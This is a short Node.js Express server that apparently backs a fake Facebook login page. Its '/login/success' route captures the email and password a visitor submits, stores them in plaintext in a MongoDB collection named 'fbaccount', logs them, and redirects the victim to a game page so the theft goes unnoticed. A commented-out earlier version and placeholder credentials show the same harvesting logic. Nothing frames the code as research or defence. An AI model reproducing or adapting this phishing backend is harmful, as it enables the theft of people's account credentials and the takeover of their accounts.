const express = require('express');
const app = express();
const { urlencoded } = require('express');
const mongoose = require('mongoose');
const fbaccount = require('./fbaccount');

mongoose.connect('mongodb://127.0.0.1:27017/accountsdb', () => { console.log('connected') } )

app.listen(process.env.PORT || 5000)
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); 

run()
async function run() {
    const newfbaccount = new fbaccount({
        email: 'johnysins',
        password: 'jo123',
        date: Date()
    })
    await newfbaccount.save()
    console.log(newfbaccount)
}

app.get('/', (req, res) => { 
    res.redirect('main.html')
})

// const account = [{
//     email : '',
//     password : '',
//     date : Date()
// }]

app.post('/login/success', (req, res) => {
    run()
    async function run() {
                newfbaccount = new fbaccount({
                email : req.body.email, 
                password : req.body.password,
                date : Date()
        })
        await newfbaccount.save()
        console.log(newfbaccount)
    }
        res.redirect('/game.html');

})

// original working post file:
// app.post('/login/success', (req, res) => {
//     account.push({
//         email : req.body.email, 
//         password : req.body.password,
//         date : Date()
//     })
//     console.log(account);
//     res.redirect('/game.html');

// })

// run()
// async function run() {
//     const newfbaccount = new fbaccount({ email:'johnyndsa@yahoo.com', password:'dsad1234', date: Date() })
//     await newfbaccount.save()
//     console.log('Account Saved')
// }
